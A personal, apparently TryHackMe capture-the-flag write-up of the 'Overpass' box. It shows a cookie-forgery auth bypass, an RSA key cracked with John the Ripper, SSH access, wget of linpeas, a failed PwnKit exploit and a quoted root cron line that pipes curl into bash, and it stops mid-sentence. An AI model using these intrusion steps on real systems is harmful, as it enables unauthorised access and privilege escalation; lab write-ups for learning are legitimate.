# OVERPASS
 
> Aaron Aguilar, Feb 09, 2023


# Hack the machine and get the flag in user.txt

### As usual we are going for a reconnaisance using nmap 

```
22/tcp open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3


80/tcp open  http    syn-ack ttl 63
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
|_http-title: Overpass
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

using gobuster I was able to find this page

>- http://10.10.146.29/admin/

### looking at the source code in the login.js it sesms like we can just log in using a cookies
```
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
### honestly, I feel lost so I looked up the write ups and thankful that mr.john hammond uploaded his writeup for this... I followed his syntax up until he was able to get the rsa and then I stopped watching

### by copying his syntax I was able to get the RSA_KEY
```
$ curl http://10.10.146.29/admin/ --cookie "SessionToken='anything'"

            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
```
### Cracking with JTR
```
--$ nano rsa_id  
--$ ssh2john rsa_id                
rsa_id:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b
 
$ nano for_john.txt
$ john for_john.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
james13          (rsa_id)     
1g 0:00:00:02 DONE 3/3 (2023-02-09 00:22) 0.3412g/s 483449p/s 483449c/s 483449C/s james13
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### since I have James password now I can now try to ssh
```
chmod 600 rsa_id   
└─$ ssh -i rsa_id james@10.10.146.29 -p 22
Enter passphrase for key 'rsa_id': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ 
james@overpass-prod:~$ pwd
/home/james
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
```

yey we got the first flag

```
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@overpass-prod:~$ [2023-02-09T00:43:11] Synchronising notes from Evernote.
```

### Privileged Escalation

now I dont know what to do again, I was trying to check for any other clue but I dont get it..
so I sent linpeas to enumerate the machinen on my kali box I shared my directory
```
└─$ sudo cp linpeas.sh /var/www/html
[sudo] password for aaron: 
┌──(aaron㉿kali)-[/opt]
└─$ cd /var/www/html
                                                                             
┌──(aaron㉿kali)-[/var/www/html]
└─$ systemctl status apache2
○ apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; preset: d>
     Active: inactive (dead)
┌──(aaron㉿kali)-[/var/www/html]
└─$ systemctl start apache2 
```                                 
back to the victime machine
```
james@overpass-prod:~$ cd /root
-bash: cd: /root: Permission denied

james@overpass-prod:~$ cd /dev/shm
james@overpass-prod:/dev/shm$ ls
james@overpass-prod:/dev/shm$ wget http://10.18.70.19/linpeas.sh
--2023-02-09 05:47:54--  http://10.18.70.19/linpeas.sh
Connecting to 10.18.70.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828087 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh            100%[=======================>] 808.68K   191KB/s    in 4.2s    

2023-02-09 05:47:58 (191 KB/s) - ‘linpeas.sh’ saved [828087/828087]
james@overpass-prod:/dev/shm$ chmod +x[2023-02-09T00:48:11] Synchronising notes from Evernote.
         [2023-02-09T00:48:11] Found 2 notes.
                                             linpeas.sh 
james@overpass-prod:/dev/shm$ ls -la
total 812
drwxrwxrwt  2 root  root      60 Feb  9 05:47 .
drwxr-xr-x 18 root  root    3760 Feb  9 04:00 ..
-rwxrwxr-x  1 james james 828087 Feb  9 05:46 linpeas.sh
james@overpass-prod:/dev/shm$ ./linpeas.sh 
```

it seems it is vulnerable to pwnkit
```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034
```
back to my kali I downloaded the CVE-2021-4034 exploit
```
james@overpass-prod:/dev/shm$ gcc hehe.c -o hoho
james@overpass-prod:/dev/shm$ ls
hehe.c  hoho  linpeas.sh
james@overpass-prod:/dev/shm$ ./hoho
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
Cannot run program pwnkit.so:.: No such file or directory
james@overpass-prod:/dev/shm$ 
```
i cannot run the pwnkit so I decided to watch the write up of mr. john hammond
so we found this vulnerability, it runs every minute
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

back to my kali machine i 






```





